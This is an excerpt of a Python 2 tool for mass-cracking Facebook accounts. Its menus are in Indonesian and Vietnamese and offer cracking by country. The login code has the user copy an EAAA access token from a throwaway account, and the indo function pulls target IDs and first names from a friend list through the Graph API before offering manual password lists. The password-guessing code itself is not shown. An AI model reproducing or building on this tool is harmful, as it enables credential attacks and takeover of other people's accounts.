...
def login():
	...
	if token in ('open', 'Open', 'OPEN'):
		print ('\n '+K+'*'+N+' note! usahakan akun tumbal login di google chrome terlebih dahulu')
		print (' '+M+'*'+N+' jangan lupa! url ubah ke https://m.facebook.com')
		print (' '+K+'*'+N+' setelah di alihkan ke google chrome. klik titik tiga')
		print (' '+M+'*'+N+' lalu klik Cari di Halaman Tinggal ketik '+H+'EAAA'+N+' Lalu salin.')
...
def menu():
	...
	print(" "+N+"[#] -------------------------------------------")
	print
	print("      "+N+"[  "+N+"Chào mừng đến với 😘"+N+"]")
	print
	print(" "+N+"[#] -------------------------------------------")
	print(" "+N+"["+M+"1] "+N+"crack indonesia")
	print(" "+N+"["+K+"2] "+N+"crack india/bangladesh")
	print(" "+N+"["+M+"3] "+N+"crack usa")
	print(" "+N+"["+K+"4] "+N+"crack vietnam")
	print(" "+N+"["+M+"5] "+N+"check result")
	print(" "+N+"["+K+"6] "+N+"setting useragent")
	print(" "+N+"["+O+"1] "+N+"logout (delete token)")
	print(" "+N+"[#] -------------------------------------------")
	ask = raw_input("\n "+N+"[?] Choose : ")
	if ask =="":
		menu()
...
def indo():
	...
	try:
		...
		print(' '+N+' [!] Token Invalid')
		tokenz()
	print("\n "+N+"["+K+"+] "+N+"Type 'me' to Crack From The Friends List")
	idt = raw_input(" "+N+"["+M+"+] "+N+" ID Public : ")
	try:
		pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
		sp = json.loads(pok.text)
		print(" "+N+"["+K+"+] "+N+"Name : "+H+""+sp["name"])
	except KeyError:
	...
	for i in z["data"]:
		...
		nm = na.rsplit(" ")[0]
		id.append(uid+'|'+nm)
	print(" "+N+"["+O+"+] "+N+"Total ID  : "+M+""+str(len(id)))
	print(" "+N+"[#] -------------------------------------------")
	ask = raw_input("\n "+N+"["+M+"?] "+N+"Want to Use a Manual Password? Y/t : ")
	if ask == "Y" or ask == "y":
		manual()
